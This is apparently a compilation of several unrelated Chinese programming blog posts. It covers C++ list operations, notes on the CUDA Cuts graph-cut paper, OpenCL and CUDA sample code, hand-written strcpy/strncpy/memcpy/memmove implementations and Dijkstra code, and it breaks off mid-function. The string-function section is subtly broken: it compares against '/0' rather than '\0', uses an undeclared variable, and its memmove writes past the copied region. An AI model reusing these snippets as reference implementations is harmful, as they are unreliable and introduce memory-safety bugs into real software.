    2、虚表的一个优点是容易保持和数据库的同步。修改数据库中的数据，然后重画list十分容易而且高效。
    3、虚表的另一个优点是可以根据需要产生数据。比如在某一列加上行号。http://blog.vckbase.com/iwaswzq/archive/2006/07/07/21113.htmlhttp://www.codeproject.com/KB/list/virtuallist.aspx






#include <list>
#include <iostream>
using namespace std;

//list  链表的打印
void print(list<int>& l)
{
	list<int>::iterator i,iend;
	iend = l.end();

	for (i=l.begin();i!=iend;i++)
	{
		cout<<*i<<' ';
	}
}

int main()
{

	list<int> l;

	for (int j = 1;j <=10;j++ )
	{
		l.push_back(j);
	}

	//splice()函数
	/*
	//void splice(iterator position , list& x)
	将x的链表归并到当前list链表的position位置之前， list对象x将被清空

	 void splice(iterator position , list& , iterator i)
	 将一个list的迭代器i值所指的元素，归并到当前list链表中， 并将被归并元素从原链表中删除


	//
	*/

	list<int> carry;
	carry.splice(carry.begin(),l,l.begin());

	cout<<"carry的链表元素为：";
	print(carry);
	cout<<endl;

	cout<<"l 的链表元素为：";
	print(l);
	cout<<endl;


	//merge()函数用法
	/*

	void merge()合并两个链表并使之默认升序(也可改)：
	*/

	list<int> x;
	x.push_back(32);
	x.push_back(33);
	x.push_back(34);

	l.merge(x);

	cout<<"l 的链表元素为：";
	print(l);
	cout<<endl;


	getchar();
	return 0;

} 





  原文出处：http://lincccc.blogspot.tw/2011/03/cuda-cuts-fast-graph-cuts-on-gpu_03.html现在需要代理才能访问，所以就转载了。  [论文笔记] CUDA Cuts: Fast Graph Cuts on the GPUPaper：V. Vineet, P. J. Narayanan. CUDA cuts: Fast graph cuts on the GPU. In Proc. CVPR Workshop, 2008.问题概述：Graph cut是一种十分有用和流行的能量优化算法，在计算机视觉领域普遍应用于前背景分割（Image segmentation）、立体视觉（stereo vision）、抠图（Image matting）等。但在获得不错效果的同时，Max-flow / Min-cost问题求解的时间代价却很大。本文作者称其所知最佳的Graph cut实现求解一张640×480的图至少需100毫秒（平均数据会差得多），无法满足实时应用的需求。但事实上，Max-flow求解中经典的Push-relabel算法在流的计算和维护上只与局部相关，具有潜在的可并行性，适于GPU加速。因此，作者实现了push-relabel算法的GPU版。作者称其算法于一张640×480的图平均每秒可以求解150次Graph cut（Nvidia 8800 GTX），也就是约6.7毫秒速，是传统CPU算法约30-40倍速。作者还提供源码的下载，点我。代码在这个大学网站的资源里面：http://cvit.iiit.ac.in/（上述代码链接失效了，有大牛找到一份，我上传到csdn了：http://download.csdn.net/download/haihong84/3481581）Definition & Notation： 对于一个图 G = (V, E) ，其中 V 为节点集合，包括源点 s 和终点 t （也可以定义多个端点，其可以优化为双顶点图）、以及其他诸多中间节点集合 V’ ，E 为连接这些节点的边，每条边附有容量 c(u, v) 代表节点 u 通过这条边流向节点 v 所能承受的最大流量，在具体应用中边的容量通常等价于其能量值。Graph cut的目的在于找到图的Min-cut，Cut将 V’ 分割为两个部分，去掉这些边将使舍得图中的任意一个节点只与 s 或 t 相连通（如下图），而Min-cut是所有cut中边的能量值总和最小的一个。  算法上要直接找Min-cut是十分困难的，通常要将问题转化为与之等价的Max-flow问题（理论推导点我）。Graph cut具体应用的性能关键在于能量函数的定义，用于计算机视觉中的一种常见能量函数定义如下：  Dp 定义数据能量，Vp, q 定义平滑度能量，N 定义相邻关系，fp 为像素 p 的标签（属于 s 或 t ）。  经典Push-relabel算法： 求解Max-flow有两种经典的算法：Ford-Fulkerson和Push-relabel算法。Ford-Fulkerson算法的大意是在图中不断寻找 s 和 t 之间可用路径，记入总流量，并维护一张残余网络（Residual graph），直到再也找不到可用路径为止，此时的总流量就是Max-flow（具体算法点我）。Ford-Fulkerson算法的串行性很大，因为可用路径的查找是全局性的，这是GPU所不擅长的。   Push-relabel算法，相对的，具有很强的局部性和可并行性，在每一个子操作中指关心节点及其相邻节点。Push-relabel的基本思路是将尽可能多的流量从 s 推向 t ，但是当 t 已经无法再接受更多的流量时，这些流量将会被反推回 s，最终达到平衡（和Ford-Fulkerson算法一样，再也找不到 s 到 t 的可用路径）。算法过程中的“流”称为Preflow（先流），它并不像Ford-Fulkerson算法过程中的流一样总是持续升高直至Max-flow，而是初始预测一个值，在不断趋近于Max-flow，过程中可能出现回流的现象。Preflow对每一个节点满足 e(u) = in(u) – out(u)，且 e(u) ≥ 0。当 e(u) > 0 时，节点 u 溢出（overflowing）。溢出的节点需要将多余的流量Push向其相邻的节点，即Push操作。当一条从 s 到 t 的路径上所有的节点都不溢出时，此路径上的Preflow就变成真正的Flow了。   Push-relabel算法和Ford-Fulkerson算法一样都会维护一张残余网络。对于图中的每一个节点 u，若在残余网络中存在 e(u, v)，则 h(u) ≤ h(v) + 1。Push操作只能在 h(u) ＞ h(v) ，u 节点溢出且 e(u, v) 残留容量时进行；而当 u 节点溢出，且与之相邻所有残留边节点的 h(v) ≥ h(u) 时，只能进行Label操作，增加节点 u 的高度，即 h(u) += 1。在初始化时，h(s) = n，t 及其他所有节点的高度均为 0；从 s 出发的所有边初始化 f(e) = c(e)，其余边 f(e) =0。Push-relabel算法将不断重复Push和Label操作，直至任意操作都无法进行。 （更详细的算法步骤推荐查阅Tutorial，点我）   比较形象点，Push-relabel是泛滥的洪水，奔腾向前，堵了就倒流；Ford-Fulkerson则是很温吞的做法，先找个人探路，回来报告能流多少水就开闸放多少。  Push-relabel算法的GPU版： 存储和线程结构： Grid拥有和输入图片一样的维度，并被分为若干个Block，每个Block的维度为 B×B。每个线程对应一个节点（像素），即每个Block对应 B×B 个节点、需要访问 (B+2)×(B+2) 个节点的数据。每个节点包含以下数据：溢出量 e(u)，高度 h(u)，活跃状态 flag(u) 以及与其相邻节点间的边的容量。活跃状态共3种：Active，e(u) ＞ 0 且 h(u) = h(v) + 1；Passive，e(u) ＞ 0 且 h(u) ≠ h(v) + 1，这种状态在Relabel后可能变成Active；Inactive，没有溢出且没有相邻残留边， 这些数据存储在全局或设备内存中，被所有线程共享。 （GPU架构及Cuda指南参考NVidia相关手册，点我）   本文作者通过4个Kernel实现GPU版Push-relabel算法： 1) Push Kernel (node u)：   ■将 h(u) 和 e(u) 从全局内存读入到Block共享内存中（使用共享内存是因为一些数据会被相邻线程共享，这种读入方式相对单独的读入更节省时间）；   ■同步线程（使用共享内存都需要做这一步，为了保证所有内存都被完全读入了）；   ■将 e(u) 按照Push规则推向相邻节点（不大于边的剩余容量，且 h(u) ≥ h(v) ）；   ■将以上Preflow记入一个特殊的全局数组 F。之所以记入 F，而不直接写入相邻节点，是因为在并行Push操作时，一个节点的溢出值同时受到多个相邻节点的影响，如果直接写入，可能造成数据的不一致性（Read-after-write data consistency）。因此，作者将原来的Push操作分成了Push和Pull两个Kernel执行（另一种选择是在同一个Kernel中分两部分执行，之间进行一次同步，但是对于Block边缘的节点，这种同步需要等待其他Block的线程，这种Block间的同步并不被所有GPU支持）。   2) Pull Kernel (node u)：   ■读入 F 中推向 u 的Preflow；   ■累加所有新的Preflow，得到最终的溢出值，记入 e(u) 到全局内存。   3) Local Relabel Kernal (node u)： 按照经典Push-relabel算法中的Relabel操作，局部地调整节点的高度   ■将 h(u) 和 flag(u) 从全局内存读入到Block共享内存中；   ■同步线程；   ■计算 u 相邻 active / passive 节点的最小高度；   ■该最小高度+1，作为新高度写入 h(u) 到全局内存。   4) Global Relabel Kernal： 从终点 t 开始，按照广度优先策略，遍历所有节点，更新其高度至正确的距离（节点的高度总是其与终点距离的下限）。迭代次数 k 被记录与全局内存中。   ■如果 k == 1，所有与 t 相邻且有残留边的节点高度被设为 1；   ■所有未被设置的节点检查其相邻节点，若其相邻节点的高度为 k，则设置该节点高度为 k+1；   ■更新高度值到全局内存。   算法总体流程： a. 计算能量矩阵 → b. Push+Pull Kernel循环 → c. Local Relabel Kernel循环 → d. Global Relabel Kernel循环 → e. 重复b到d至收敛（没有可进行的Push和Relabel操作）   作者还基于GPU实现了Dynamic graph cut，应用于连续细微变化的Graph cut，通过对前一帧的简单修改形成新图，重用其他数据，加速Max-flow的求解。作者的实验数据称GPU实现可以提速70-100倍。不过具体应用具体分析，提速肯定是有的，多少未知，要待我实现过试验过。据说这个印度人提供的代码Bug颇多，虽然不太信，但还是先做了要重新实现的准备。末了，吐个槽，这论文贡献不大，确实只是发Workshop的水平。  





 参考文献：
http://blog.csdn.net/neoxmu/article/details/8866928
我安装的是CUDA5.5,代码如下：
 
//#include "stdafx.h"
#include "CL\cl.h"
#include <stdlib.h>
#include <stdio.h>

#pragma comment(lib,"OpenCL.lib")

#define CL_VERBOSE
void openclRetTackle(cl_int retValue, char* processInfo){
	if(retValue!=CL_SUCCESS){
#if (defined CL_DEBUG) || (defined CL_VERBOSE)
		printf("%s Error!\n",processInfo);
#endif
		exit(-1);
	}else{
#ifdef CL_VERBOSE
		printf("%s Success!\n",processInfo);
#endif
	}
}

cl_platform_id cpPlatform;
cl_device_id cdDevice;
cl_context cxGPUContext;
cl_command_queue cqCommandQueue;


int openclInit()
{
	cl_int ret;
	//得到平台ID
	openclRetTackle( clGetPlatformIDs(1, &cpPlatform, NULL), "clGetPlatFormIDs");
	//得到GPU设备ID
	openclRetTackle( clGetDeviceIDs(cpPlatform, CL_DEVICE_TYPE_GPU,1,&cdDevice,NULL), "clGetDeviceIDs");
	//获取GPU设备上下文
	cxGPUContext = clCreateContext(0, 1, &cdDevice, NULL, NULL, &ret);
	openclRetTackle( ret , "clCreateContext" );
	//开辟任务队列
	cqCommandQueue = clCreateCommandQueue(cxGPUContext, cdDevice, 0, &ret);
	openclRetTackle( ret , "clCreateCommandQueue");
	return CL_SUCCESS;
}

int run()
{
	openclInit();	
	system("pause");
	return 0;
}


 
<span style="font-family:Microsoft YaHei;font-size:18px;">//#include "stdafx.h"
#include <stdio.h>
#include <vector>
#include <CL/cl.h>
#include <iostream>
#include <fstream>
#include <string>

#pragma comment(lib,"OpenCL.lib")

int print_device()
{
	cl_int err;
	cl_uint num;
	err = clGetPlatformIDs(0, 0, &num);
	if(err != CL_SUCCESS) 
	{
		std::cerr << "Unable to get platforms\n";
		return 0;
	}
	std::vector<cl_platform_id> platforms(num);
	err = clGetPlatformIDs(num, &platforms[0], &num);
	if(err != CL_SUCCESS)
	{
		std::cerr << "Unable to get platform ID\n";
		return 0;
	}

	cl_context_properties prop[] = { CL_CONTEXT_PLATFORM, reinterpret_cast<cl_context_properties>(platforms[0]), 0 };
	cl_context context = clCreateContextFromType(prop, CL_DEVICE_TYPE_DEFAULT, NULL, NULL, NULL);
	if(context == 0)
	{
		std::cerr << "Can't create OpenCL context\n";
		return 0;
	}

	size_t cb;
	clGetContextInfo(context, CL_CONTEXT_DEVICES, 0, NULL, &cb);
	std::vector<cl_device_id> devices(cb / sizeof(cl_device_id));
	clGetContextInfo(context, CL_CONTEXT_DEVICES, cb, &devices[0], 0);

	clGetDeviceInfo(devices[0], CL_DEVICE_NAME, 0, NULL, &cb);
	std::string devname;
	devname.resize(cb);
	clGetDeviceInfo(devices[0], CL_DEVICE_NAME, cb, &devname[0], 0);
	std::cout << "Device: " << devname.c_str() << "\n";

	clReleaseContext(context);
	return 0;

}

cl_program load_program(cl_context context, const char* filename)
{
	std::ifstream in(filename, std::ios_base::binary);
	if(!in.good()) 
	{
		return 0;

	}// get file length
	in.seekg(0, std::ios_base::end);
	size_t length = in.tellg();
	in.seekg(0, std::ios_base::beg);

	// read program source
	std::vector<char> data(length + 1);
	in.read(&data[0], length);
	data[length] = 0;

	// create and build program 
	const char* source = &data[0];
	cl_program program = clCreateProgramWithSource(context, 1, &source, 0, 0);
	if(program == 0) 
	{
		return 0;
	}
	if(clBuildProgram(program, 0, 0, 0, 0, 0) != CL_SUCCESS) 
	{
		return 0;
	}
	return program;
}
int main()
{
	print_device();
	cl_int err;
	cl_uint num;
	err = clGetPlatformIDs(0, 0, &num);
	if(err != CL_SUCCESS) 
	{
		std::cerr << "Unable to get platforms\n";
		return 0;
	}

	std::vector<cl_platform_id> platforms(num);
	err = clGetPlatformIDs(num, &platforms[0], &num);
	if(err != CL_SUCCESS) 
	{
		std::cerr << "Unable to get platform ID\n";
		return 0;
	}
	cl_context_properties prop[] = { CL_CONTEXT_PLATFORM, reinterpret_cast<cl_context_properties>(platforms[0]), 0 };
	cl_context context = clCreateContextFromType(prop, CL_DEVICE_TYPE_DEFAULT, NULL, NULL, NULL);
	if(context == 0) 
	{
		std::cerr << "Can't create OpenCL context\n";
		return 0;
	}

	size_t cb;
	clGetContextInfo(context, CL_CONTEXT_DEVICES, 0, NULL, &cb);
	std::vector<cl_device_id> devices(cb / sizeof(cl_device_id));
	clGetContextInfo(context, CL_CONTEXT_DEVICES, cb, &devices[0], 0);

	clGetDeviceInfo(devices[0], CL_DEVICE_NAME, 0, NULL, &cb);
	std::string devname;
	devname.resize(cb);
	clGetDeviceInfo(devices[0], CL_DEVICE_NAME, cb, &devname[0], 0);
	std::cout << "Device: " << devname.c_str() << "\n";

	cl_command_queue queue = clCreateCommandQueue(context, devices[0], 0, 0);
	if(queue == 0)
	{
		std::cerr << "Can't create command queue\n";
		clReleaseContext(context);
		return 0;
	}

	const int DATA_SIZE = 1048576;
	std::vector<float> a(DATA_SIZE), b(DATA_SIZE), res(DATA_SIZE);
	for(int i = 0; i < DATA_SIZE; i++) 
	{
		a[i] = std::rand();
		b[i] = std::rand();
	}

	cl_mem cl_a = clCreateBuffer(context, CL_MEM_READ_ONLY | CL_MEM_COPY_HOST_PTR, sizeof(cl_float) * DATA_SIZE, &a[0], NULL);
	cl_mem cl_b = clCreateBuffer(context, CL_MEM_READ_ONLY | CL_MEM_COPY_HOST_PTR, sizeof(cl_float) * DATA_SIZE, &b[0], NULL);
	cl_mem cl_res = clCreateBuffer(context, CL_MEM_WRITE_ONLY, sizeof(cl_float) * DATA_SIZE, NULL, NULL);
	if(cl_a == 0 || cl_b == 0 || cl_res == 0)
	{
		std::cerr << "Can't create OpenCL buffer\n";
		clReleaseMemObject(cl_a);
		clReleaseMemObject(cl_b);
		clReleaseMemObject(cl_res);
		clReleaseCommandQueue(queue);
		clReleaseContext(context);
		return 0;
	}

	cl_program program = load_program(context, "..\\shader.txt");
	if(program == 0) 
	{
		std::cerr << "Can't load or build program\n";
		clReleaseMemObject(cl_a);
		clReleaseMemObject(cl_b);
		clReleaseMemObject(cl_res);
		clReleaseCommandQueue(queue);
		clReleaseContext(context);
		return 0;
	}
	cl_kernel adder = clCreateKernel(program, "adder", 0);
	if(adder == 0)
	{
		std::cerr << "Can't load kernel\n";
		clReleaseProgram(program);
		clReleaseMemObject(cl_a);
		clReleaseMemObject(cl_b);
		clReleaseMemObject(cl_res);
		clReleaseCommandQueue(queue);
		clReleaseContext(context);
		return 0;
	}

	clSetKernelArg(adder, 0, sizeof(cl_mem), &cl_a);

	clSetKernelArg(adder, 1, sizeof(cl_mem), &cl_b);

	clSetKernelArg(adder, 2, sizeof(cl_mem), &cl_res);

	size_t work_size = DATA_SIZE;

	err = clEnqueueNDRangeKernel(queue, adder, 1, 0, &work_size, 0, 0, 0, 0);
	if(err == CL_SUCCESS)
	{

		err = clEnqueueReadBuffer(queue, cl_res, CL_TRUE, 0, sizeof(float) * DATA_SIZE, &res[0], 0, 0, 0);
	}
	if(err == CL_SUCCESS)
	{
		bool correct = true;
		for(int i = 0; i < DATA_SIZE; i++) 
		{
			if(a[i] + b[i] != res[i])
			{
				correct = false;
				break;
			}
		}
		if(correct) 
		{

			std::cout << "Data is correct\n";
		}
		else 
		{

			std::cout << "Data is incorrect\n";

		}
	}

	else 
	{
		std::cerr << "Can't run kernel or read back data\n";
	}


	clReleaseKernel(adder);
	clReleaseProgram(program);
	clReleaseMemObject(cl_a);
	clReleaseMemObject(cl_b);
	clReleaseMemObject(cl_res);
	clReleaseCommandQueue(queue);
	clReleaseContext(context);	
	return 0;

}</span>
 
 
需要使用的数据：
 
shader.txt
<span style="font-family:Microsoft YaHei;font-size:18px;">__kernel void adder(__global const float* a, __global const float* b, __global float* result)
{
    int idx = get_global_id(0);
    result[idx] = a[idx] + b[idx];
}</span>
 






1.注意事项编译的办法参见：http://blog.csdn.net/wangyaninglm/article/details/39997113 以下是程序代码，网上搜的例子：注意事项：32位工程添加64位的支持（主要取决于你编译的版本），配置好cuda的项目路径include2.代码//swap.cu


#include "cuda_runtime.h"
#include "device_launch_parameters.h"

#include <opencv2/core/cuda_devptrs.hpp>
using namespace cv;
using namespace cv::gpu;

//自定义内核函数
__global__ void swap_rb_kernel(const PtrStepSz<uchar3> src,PtrStep<uchar3> dst)
{
    int x = threadIdx.x + blockIdx.x * blockDim.x;
    int y = threadIdx.y + blockIdx.y * blockDim.y;

    if(x < src.cols && y < src.rows)
    {
        uchar3 v = src(y,x);
        dst(y,x) = make_uchar3(v.z,v.y,v.x);
    }
}

extern "C" void swap_rb_caller(const PtrStepSz<uchar3>& src,PtrStep<uchar3> dst,cudaStream_t stream)
{
    dim3 block(32,8);
    dim3 grid((src.cols + block.x - 1)/block.x,(src.rows + block.y - 1)/block.y);

    swap_rb_kernel<<<grid,block,0,stream>>>(src,dst);
    if(stream == 0)
        cudaDeviceSynchronize();
}  //swap.cpp



#include <opencv2/gpu/gpu.hpp>
#include <opencv2/gpu/stream_accessor.hpp>


using namespace cv;
using namespace cv::gpu;

extern "C" void swap_rb_caller(const PtrStepSz<uchar3>& src,PtrStep<uchar3> dst,cudaStream_t stream);

extern "C" void swap_rb(const GpuMat& src,GpuMat& dst,Stream& stream = Stream::Null())
{
	CV_Assert(src.type() == CV_8UC3);
	dst.create(src.size(),src.type());
	cudaStream_t s = StreamAccessor::getStream(stream);
	swap_rb_caller(src,dst,s);
}
 //main.cpp

#include <iostream>
#include <opencv2/opencv.hpp>
#include <opencv2/gpu/gpu.hpp>

#pragma comment(lib,"opencv_gpu2410d.lib")
#pragma comment(lib,"opencv_core2410d.lib")
#pragma comment(lib,"opencv_highgui2410d.lib")

using namespace cv;
using namespace cv::gpu;

extern "C" void swap_rb(const GpuMat& src,GpuMat& dst,Stream& stream = Stream::Null());

int main()
{
	Mat image = imread("lena.jpg");
	imshow("src",image);
	GpuMat gpuMat,output;

	gpuMat.upload(image);
	swap_rb(gpuMat,output);
	output.download(image);

	imshow("gpu",image);
	getchar();
	waitKey(0);
	return 0;
} 3.实现效果： 4.其他注意事项假设有两个工程：CUDA工程TestCuda；C++工程CallCuda 1. 在CUDA工程TestCuda中， （1）.cpp文件（类成员函数定义）调用.cu文件下的函数例如.cu文件下的函数void run_kernel(); 其前面必须用 extern “C” 修饰。而.cpp文件（类成员函数定义）下的类成员函数，如，void cpp_run();如果它想调用 run_kernel()，则首先可在.h文件（类定义）中的类定义的外面先声明.cu文件下的C函数，例如，extern “C” void run_kernel();（2）CUDA工程属性-->常规中，选择配置类型为“静态库(.lib)”-->应用； 同时在工程属性下的库管理器-->常规项下的附加依赖项中，添加CUDA库：cudart.lib，curand.lib等；在附加库目录添加相应的库所在目录。2.另外的C++工程CallCuda 在CallCuda工程属性下，找到附加依赖项，添加：CUDA库(cudart.lib等)和TestCuda生成的静态库(TestCuda.lib)；以及添加附加库目录。 至此，该工程下的.cpp文件下的函数，就可以调用CUDA工程下的cpp_run()函数了，不过首先要实例化类。1.将example.cu添加到工程中。在已有工程上右键单击，选择添加已有项。2.添加编译规则。右键单击工程文件，选择“自定义生成规则”，在弹出的对话框中选择CUDA Build Rule x.x。3.修改.cu文件的编译器。右键单击.cu文件，单击属性，修改编译规则，选择刚才添加的CUDA编译器。4.添加包含目录。在项目属性-》C++->常规->附加包含目录中添加CUDA SDK的目录。例如"C:\Program Files\NVIDIA Corporation\NVIDIA GPU Computing SDK 3.2\C\common\inc";"C:\Program Files\NVIDIA GPU Computing Toolkit\CUDA\v4.0\include"5.添加.lib文件。在链接器-》输入中添加cudart.lib cutil32D.lib6.修改代码生成为多线程(/MT)方式。7.Done.  以上是工程配置。 除此之外，还要把调用cuda代码的c++函数在.cu文件中用extern "C" 包含起来。并且在调用文件.cpp中用extern "C"声明该函数，然后调用。   





 代码来自：
 
http://blog.csdn.net/v_JULY_v
 
 
//得9 分
//为了实现链式操作，将目的地址返回，加2 分！
char * strcpy( char *strDest, const char *strSrc )
{
assert( (strDest != NULL) && (strSrc != NULL) );
char *address = strDest;
while( (*strDest++ = * strSrc++) != '/0' );
return address;
}

//得10 分，基本上所有的情况，都考虑到了
//如果有考虑到源目所指区域有重叠的情况，加1 分！
char * strcpy( char *strDest, const char *strSrc )
{
if(strDest == strSrc) { return strDest; }
assert( (strDest != NULL) && (strSrc != NULL) );
char *address = strDest;
while((*strDest++ = *strSrc++)!='/0');
return address;
}


 
 
strncpy 是 C语言的函数之一，来自 C语言标准库，定义于 string.h，char *strncpy(char *destin, char *source, int maxlen)，把src所指由NULL结束的字符串的前n个字节复制到dest所指的数组中。
char *strncpy(char *strDes, const char *strSrc, unsigned int count)
{
assert(strDes != NULL && strSrc != NULL);
char *address = strDes;
while (count-- && *strSrc != '/0')
*strDes++ = *strSrc++;
*strDes = '/0';
return address;
}
 
 
 
strcpy和memcpy都是标准C库函数，它们有下面特点：
strcpy提供了字符串的复制。即strcpy只用于字符串复制，并且它不仅复制字符串内容外，还会复制字符串的结束符。
strcpy的函数原型是：char* strcpy(char* dest, const char* src);
 
memcpy只提供一般的内存复制，即memcpy对于需要复制的内容没有限制，因此用途更广。
memcpy的函数原型是：void *memcpy(void *dest,  const char* src,  size_t count);
 
  char *strcpy(char *dest, const char *src)  {     if((src == NULL) || (dest == NULL))      {          return NULL;     }
      char *strdest = dest; // 保存目标字符串的首地址     while((*dest++ = *str) != '\0');
     return strdest;
 }


 
 


void *memcpy(void *memTo, const char *memFrom, size_t size)
{
     if((memTo == NULL) || (memFrom == NULL))
     {
          return NULL;
     }
     char *tempFrom = (char *)memFrom; //保存memFrom的首地址     char *tempTo = (char *)memTo; //保存memTo的首地址      while(size-- > 0)
     {
          *tempTo++ = *tempFrom++;
     }
     return memTo;
}


 
strcpy 和 memcpy主要有以下三方面的区别：
1、复制的内容不同。strcpy只能复制字符串，而memcpy可以复制任意内容，例如字符串、整型、结构体、类等。
2、复制的方法不同。strcpy不需要指定长度，它遇到被复制字符串的结束符"\0”才结束，所以容易溢出。memcpy则是根据第3个参数决定复制的长度。
3、用途不同。通常在复制字符串时用strcpy，而需要复制其它类型的数据是用memcpy。
 
memcpy 和 memmove 都是C语言中的库函数，在库函数 string.h中，其原型相似，它们都是从src所指向的内存中复制count个字节到dest所指内存中。并返回dest的值。
当源内存区域 和 目标内存区域无交叉重叠时，两者的结果是一样的，但如果有交叉呢？
memcpy是从src的其实部分开始复制，所以虽然第一种情况下没有问题，但如果遇到第二种情况，则会发生错误，交叉部分的src内容就会被覆盖掉了。
而memmove则由于采用不同的复制机制，所以可以正确处理第二种情况。
 
 


void *memmove(void *dst,const void *src,int n)
{
     char *dp = (char *)dst;
     char *sp = (char *)src; 
     assert((src!=0)&&(dst!=0)&&(n>0));//not　null 
     //非重叠 
      //dp < sp 
     //dp > (sp+n)     if(sp>dp||(sp+n)<dp)
     { 
         while(n--) 
             *(dp++) = *(sp++);
         *dp = '\0';
     }
     else if(sp<dp)//重叠 (此时条件 sp<dp<(sp+n))如果sp==dp则快速的返回     {//反向拷贝            sp += n; 
         dp += n; 
         *dp = '\0'; 
         while(n--)
            *(--dp) = *(--sp); 
     }
     return dst;
}       


 
在很多库函数上看到使用了assert()函数，assert函数的作用是计算表达式expression ，如果其值为假（即为0），那么它先向stderr打印一条错误信息，然后调用abort()来终止进程。
函数名: abort
功 能: 异常终止一个进程
描述：abort()函数首先解除进程对SIGABRT信号的阻止，然后向调用进程发送该信号。abort()函数会导致进程的异常终止除非SIGABRT信号被捕捉并且信号处理句柄没有返回。
abort()函数导致所有的流被关闭和冲洗。
abort()函数没有返回值：void abort(void);
用 法: void abort(void);
程序例:
#include <stdio.h>
#include <stdlib.h>
int main(void) 
{ 
printf("Calling abort()\n");
abort();
return 0; /* This is never reached */
 }




 






 Dijkstra(迪杰斯特拉)算法是典型的最短路径路由算法，用于计算一个节点到其他所有节点的最短路径。主要特点是以起始点为中心向外层层扩展，直到扩展到终点为止。Dijkstra算法能得出最短路径的最优解，但由于它遍历计算的节点很多，所以效率低。
　　Dijkstra算法是很有代表性的最短路算法，在很多专业课程中都作为基本内容有详细的介绍，如数据结构，图论，运筹学等等。
其基本思想是，设置顶点集合S并不断地作贪心选择来扩充这个集合。一个顶点属于集合S当且仅当从源到该顶点的最短路径长度已知。
初始时，S中仅含有源。设u是G的某一个顶点，把从源到u且中间只经过S中顶点的路称为从源到u的特殊路径，并用数组dist记录当前每个顶点所对应的最短特殊路径长度。Dijkstra算法每次从V-S中取出具有最短特殊路长度的顶点u，将u添加到S中，同时对数组dist作必要的修改。一旦S包含了所有V中顶点，dist就记录了从源到所有其它顶点之间的最短路径长度。
例如，对下图中的有向图，应用Dijkstra算法计算从源顶点1到其它顶点间最短路径的过程列在下表中。
 
 


Dijkstra算法的迭代过程：
 
 

 
 
 
 
#include <stdio.h>
#include <conio.h>
#include <stdlib.h>

#define X 10000
#define VertexNum  7  //实际上共有六个顶点（1---6）
#define EdgeNum  9

int Graph[VertexNum][VertexNum] =
//0  1  2  3  4  5  6
{ X, X, X, X, X, X, X,  //0
  X, X, 6, 3, X, X, X,  //1
  X, X, X, X, 5, X, X,  //2
  X, X, 2, X, 3, 4, X,  //3
  X, X, X, X, X, X, 3,  //4
  X, X, X, X, 2, X, 5,  //5
  X, X, X, X, X, X, X   //6
};

int Visited[VertexNum];
int path[VertexNum];
int Distance[VertexNum];

void Dijkstra(int Begin)
{
  int MinEdge, Vertex, i,j, Edges;
  Edges = 1;
  Visited[Begin] = 1;
  for (i = 1; i<VertexNum; i++) Distance[i] = Graph[Begin][i];

  Distance[Begin] = 0;
  printf("     1  2  3  4  5  6\\n");
  printf("-----------------------------------\\n");
  printf("s:%d", Edges);
  for( i=1; i<VertexNum; i++)
  if (Distance[i] == X) printf("  *"); else printf("%3d",Distance[i]);
  printf("\\n");
  while( Edges<VertexNum-1)
  {
    Edges++; MinEdge = X;
    for(j=1; j<VertexNum; j++)
    if (Visited[j]==0 && MinEdge > Distance[j] )
    {
 Vertex = j; MinEdge = Distance[j];
    }
    Visited[Vertex] = 1;
    printf("s:%d",Edges);
    for(j=1; j<VertexNum; j++)
    {
      if (Visited[j] == 0 && Distance[Vertex] + Graph[Vertex][j] <Distance[j])
      {   Distance[j] = Distance[Vertex] + Graph[Vertex][j];
   path[j] = Vertex;
      }
      //printf("%6d",Distance[j]);
       if (Distance[j] == X) printf("  *"); else printf("%3d",Distance[j]);
    }
    printf("\\n");
  }
}

void main()
{
  
  int i;
  int k;
 // clrscr();
  for(i=0; i<VertexNum; i++) { Visited[i] = 0;  path[i] = 1;}
  Dijkstra(1);
  printf("\\n\\nAll Path-------------------------\\n");


  for(i=2; i<VertexNum; i++) //printf("%5d",Visited[i]);
  {
     printf("[%d] ",Distance[i]);
     k = i;
     do
     {
       printf("%d<--",k);
       k  = path[k];
     } while (k!=1);
     printf("1 \\n");
  }
}


以上代码参考了数据结构课本
 
 
下面的是网上的代码：
以下是具体的实现(C/C++):
/***************************************
* About:    有向图的Dijkstra算法实现
* Author:   Tanky Woo
* Blog:     www.WuTianQi.com
***************************************/
 
#include <iostream>
using namespace std;
 
const int maxnum = 100;
const int maxint = 999999;
 
 
void Dijkstra(int n, int v, int *dist, int *prev, int c[maxnum][maxnum])
{
    bool s[maxnum];    // 判断是否已存入该点到S集合中
    for(int i=1; i<=n; ++i)
    {
        dist[i] = c[v][i];
        s[i] = 0;     // 初始都未用过该点
        if(dist[i] == maxint)
            prev[i] = 0;
        else
            prev[i] = v;
    }
    dist[v] = 0;
    s[v] = 1;
 
    // 依次将未放入S集合的结点中，取dist[]最小值的结点，放入结合S中
    // 一旦S包含了所有V中顶点，dist就记录了从源点到所有其他顶点之间的最短路径长度
    for(int i=2; i<=n; ++i)
    {
        int tmp = maxint;
        int u = v;
        // 找出当前未使用的点j的dist[j]最小值
        for(int j=1; j<=n; ++j)
            if((!s[j]) && dist[j]<tmp)
            {
                u = j;              // u保存当前邻接点中距离最小的点的号码
                tmp = dist[j];
            }
        s[u] = 1;    // 表示u点已存入S集合中
 
        // 更新dist
        for(int j=1; j<=n; ++j)
            if((!s[j]) && c[u][j]<maxint)
            {
                int newdist = dist[u] + c[u][j];
                if(newdist < dist[j])
                {
                    dist[j] = newdist;
                    prev[j] = u;
                }
            }
    }
}
 
void searchPath(int *prev,int v, int u)
{
    int que[maxnum];
    int tot = 1;
    que[tot] = u;
    tot++;
    int tmp = prev[u];
    while(tmp != v)
    {
        que[tot] = tmp;
        tot++;
        tmp = prev[tmp];
    }
    que[tot] = v;
    for(int i=tot; i>=1; --i)
        if(i != 1)
            cout << que[i] << " -> ";
        else
            cout << que[i] << endl;
}
 
int main()
{
    freopen("input.txt", "r", stdin);
    // 各数组都从下标1开始
    int dist[maxnum];     // 表示当前点到源点的最短路径长度
    int prev[maxnum];     // 记录当前点的前一个结点
    int c[maxnum][maxnum];   // 记录图的两点间路径长度
    int n, line;             // 图的结点数和路径数
 
    // 输入结点数
    cin >> n;
    // 输入路径数
    cin >> line;
    int p, q, len;          // 输入p, q两点及其路径长度
 
    // 初始化c[][]为maxint
    for(int i=1; i<=n; ++i)
        for(int j=1; j<=n; ++j)
            c[i][j] = maxint;
 
    for(int i=1; i<=line; ++i)  
    {
        cin >> p >> q >> len;
        if(len < c[p][q])       // 有重边
        {
            c[p][q] = len;      // p指向q
            c[q][p] = len;      // q指向p，这样表示无向图
        }
    }
 
    for(int i=1; i<=n; ++i)
        dist[i] = maxint;
    for(int i=1; i<=n; ++i)
    {
        for(int j=1; j<=n; ++j)
            printf("%8d", c[i][j]);
        printf("\n");
    }
